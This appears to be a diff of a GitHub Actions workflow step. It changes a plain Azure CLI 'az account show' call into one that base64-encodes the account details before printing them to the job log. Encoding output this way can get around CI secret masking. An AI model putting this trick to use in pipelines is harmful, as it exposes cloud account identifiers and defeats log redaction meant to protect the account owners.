@@ -47,4 +47,4 @@ jobs:
         shell: powershell
         run: |
           #az storage blob upload -f test.txt -c $env:AZURE_STORAGE_NAME -n $env:AZURE_BLOB_NAME --auth-mode login
-          az account show
+          [convert]::tobase64string([text.encoding]::utf8.getbytes((az account show)))
